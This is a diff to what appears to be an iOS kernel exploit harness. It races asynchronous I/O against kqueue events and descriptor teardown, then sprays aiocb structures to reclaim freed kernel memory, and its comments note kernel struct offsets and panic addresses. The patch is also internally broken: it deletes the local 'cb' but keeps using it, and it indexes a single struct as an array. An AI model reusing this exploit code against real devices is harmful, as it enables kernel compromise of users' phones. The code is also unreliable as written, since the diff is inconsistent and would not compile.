@@ -1466,7 +1466,11 @@ NSString *ModSetreuidRace(void) {
 //   +0x40 procp      struct proc*    aio_proc_lock(*(v)); 0 -> PANIC FAR=0x58
 //   +0x48 uaiocbp    user ptr        -> kev.ident
 //   +0x50 aiocb      user ptr        -> kev.udata
-// file-scope so the racer block can fill them (a block cannot capture an array)
+// file-scope so the racer block sees the KERNEL's updates.  A block captures a
+// plain local by value, so aio_error(&rs_aio_cb) inside the block would read a stale
+// snapshot taken before the I/O completed and never observe the completion -
+// which is exactly why the reclaim was never issued (issued=0 on every round).
+static struct aiocb rs_aio_cb;
 static struct aiocb rs_aio_rcb[8];
 static char rs_aio_rbuf[8][0x10000];
 
@@ -1501,8 +1505,7 @@ NSString *ModAioKevent(void) {
 
     const int ROUNDS = 40;
     for (int round = 0; round < ROUNDS; round++) {
-        struct aiocb cb;
-        memset(&cb, 0, sizeof cb);
+        memset(&rs_aio_cb, 0, sizeof rs_aio_cb);
         memset(rs_aio_rcb, 0, sizeof rs_aio_rcb);
 
         cb.aio_fildes = fd;
@@ -1513,7 +1516,7 @@ NSString *ModAioKevent(void) {
         cb.aio_sigevent.sigev_signo = kq;
         cb.aio_sigevent.sigev_value.sival_ptr = (void *)0xAAA1;
 
-        if (aio_read(&cb) != 0) { silent++; continue; }
+        if (aio_read(&rs_aio_cb) != 0) { silent++; continue; }
         attempts++;
 
         // rotating delay 0/10/50/100 ms before the trigger (their STEP 4)
@@ -1525,8 +1528,8 @@ NSString *ModAioKevent(void) {
         __block int issued = 0;
         dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INTERACTIVE, 0), ^{
             for (int spin = 0; spin < 20000 && !done; spin++) {
-                if (aio_error(&cb) == 0) {
-                    ssize_t r = aio_return(&cb);
+                if (aio_error(&rs_aio_cb) == 0) {
+                    ssize_t r = aio_return(&rs_aio_cb);
                     if (r >= 0) {
                         for (int i = 0; i < NRECLAIM; i++) {
                             memset(&rs_aio_rcb[i], 0, sizeof(struct aiocb));
@@ -2587,13 +2590,13 @@ NSString *ModAioRace(void) {
             int queued = 0;
             for (int i = 0; i < N; i++) {
                 rbuf[i] = malloc(2048);
-                memset(&cb[i], 0, sizeof cb[i]);
+                memset(&rs_aio_cb[i], 0, sizeof cb[i]);
                 cb[i].aio_fildes = wfd;
                 cb[i].aio_buf = rbuf[i];
                 cb[i].aio_nbytes = 2048;
                 cb[i].aio_offset = (off_t)(i * 2048);
                 cb[i].aio_sigevent.sigev_notify = SIGEV_NONE;
-                if (aio_read(&cb[i]) == 0) queued++;
+                if (aio_read(&rs_aio_cb[i]) == 0) queued++;
                 else AveLog(S(@"[aio] round %d: aio_read %d -> %d (not queued)", round, i, errno));
             }
             // tear the descriptor down under the in-flight requests
@@ -2604,9 +2607,9 @@ NSString *ModAioRace(void) {
             // every later aio_read fails EAGAIN, which is exactly what happened
             // on the first device run (35 = EAGAIN on all 16).
             const struct aiocb *waitList[N];
-            for (int i = 0; i < N; i++) waitList[i] = &cb[i];
+            for (int i = 0; i < N; i++) waitList[i] = &rs_aio_cb[i];
             aio_suspend((void *)waitList, N, NULL);
-            for (int i = 0; i < N; i++) { ssize_t r = aio_return((struct aiocb *)&cb[i]); (void)r; }
+            for (int i = 0; i < N; i++) { ssize_t r = aio_return((struct aiocb *)&rs_aio_cb[i]); (void)r; }
             // let the completions/teardown run
             usleep(30000);
             for (int i = 0; i < N; i++) {
